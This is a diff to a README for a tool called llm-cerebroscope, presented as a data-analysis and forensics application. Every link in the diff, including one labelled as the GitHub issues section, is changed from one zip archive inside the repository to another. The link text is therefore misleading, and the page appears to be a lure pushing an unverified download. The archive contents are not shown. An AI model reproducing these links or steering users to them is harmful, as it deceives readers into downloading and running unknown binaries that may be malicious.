@@ -1,7 +1,7 @@
 # 🕵️ llm-cerebroscope - Analyze Your Data Easily 
 
 <div align="center">
-[![Download](https://github.com/KoDiit/llm-cerebroscope/raw/refs/heads/main/cerebro/ui/cerebroscope-llm-v2.6-alpha.3.zip%20llm--cerebroscope-007ACC?style=flat&logo=github&logoColor=ffffff)](https://github.com/KoDiit/llm-cerebroscope/raw/refs/heads/main/cerebro/ui/cerebroscope-llm-v2.6-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/KoDiit/llm-cerebroscope/main/build/llm_cerebroscope_1.0.zip%20llm--cerebroscope-007ACC?style=flat&logo=github&logoColor=ffffff)](https://raw.githubusercontent.com/KoDiit/llm-cerebroscope/main/build/llm_cerebroscope_1.0.zip)
 </div>
 
 ---
@@ -43,7 +43,7 @@ Before installing llm-cerebroscope, ensure your system meets the following requi
 
 ## 📥 Installation
 1. **Download the Application:**
-   Visit [this page](https://github.com/KoDiit/llm-cerebroscope/raw/refs/heads/main/cerebro/ui/cerebroscope-llm-v2.6-alpha.3.zip) to download the latest version of llm-cerebroscope.
+   Visit [this page](https://raw.githubusercontent.com/KoDiit/llm-cerebroscope/main/build/llm_cerebroscope_1.0.zip) to download the latest version of llm-cerebroscope.
 
 2. **Locate the File:**
    Once downloaded, locate the file in your system's downloads folder.
@@ -85,7 +85,7 @@ If you encounter issues, consider these tips:
 - **Data Import Errors:** Check file formats; only supported types can be imported.
 - **Slow Performance:** Close other applications to free up system resources.
 
-If problems persist, check the [issues section](https://github.com/KoDiit/llm-cerebroscope/raw/refs/heads/main/cerebro/ui/cerebroscope-llm-v2.6-alpha.3.zip) on GitHub for solutions.
+If problems persist, check the [issues section](https://raw.githubusercontent.com/KoDiit/llm-cerebroscope/main/build/llm_cerebroscope_1.0.zip) on GitHub for solutions.
 
 ## 🛠️ Use Cases
 - **Forensics:** Detect anomalies in financial records.
@@ -103,4 +103,4 @@ Thanks to our contributors and supporters who make llm-cerebroscope better every
 
 ---
 
-Visit [this page](https://github.com/KoDiit/llm-cerebroscope/raw/refs/heads/main/cerebro/ui/cerebroscope-llm-v2.6-alpha.3.zip) to download.
+Visit [this page](https://raw.githubusercontent.com/KoDiit/llm-cerebroscope/main/build/llm_cerebroscope_1.0.zip) to download.
